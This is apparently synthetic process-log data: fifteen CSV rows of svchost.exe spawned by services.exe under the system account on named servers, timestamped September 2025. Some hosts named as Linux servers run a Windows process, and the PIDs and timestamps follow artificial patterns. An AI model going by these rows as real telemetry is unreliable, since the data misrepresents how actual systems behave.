winsrv0258,system,svchost.exe,7200,services.exe,500,null,2025-09-15 08:39:09.789678 UTC
winsrv0262,system,svchost.exe,7800,services.exe,500,null,2025-09-15 08:41:09.123012 UTC
linsrv0338,system,svchost.exe,7300,services.exe,500,null,2025-09-15 08:39:24.456345 UTC
winsrv0224,system,svchost.exe,2100,services.exe,500,null,2025-09-15 08:22:09.456345 UTC
winsrv0270,system,svchost.exe,9000,services.exe,500,null,2025-09-15 08:45:09.789678 UTC
linsrv0320,system,svchost.exe,4600,services.exe,500,null,2025-09-15 08:30:24.456345 UTC
winsrv0250,system,svchost.exe,6000,services.exe,500,null,2025-09-15 08:35:09.123012 UTC
winsrv0234,system,svchost.exe,3600,services.exe,500,null,2025-09-15 08:27:09.789678 UTC
winsrv0230,system,svchost.exe,3000,services.exe,500,null,2025-09-15 08:25:09.456345 UTC
linsrv0348,system,svchost.exe,8800,services.exe,500,null,2025-09-15 08:44:24.789678 UTC
winsrv0260,system,svchost.exe,7500,services.exe,500,null,2025-09-15 08:40:09.456345 UTC
linsrv0306,system,svchost.exe,2500,services.exe,500,null,2025-09-15 08:23:24.789678 UTC
linsrv0314,system,svchost.exe,3700,services.exe,500,null,2025-09-15 08:27:24.456345 UTC
winsrv0236,system,svchost.exe,3900,services.exe,500,null,2025-09-15 08:28:09.456345 UTC
winsrv0226,system,svchost.exe,2400,services.exe,500,null,2025-09-15 08:23:09.123012 UTC
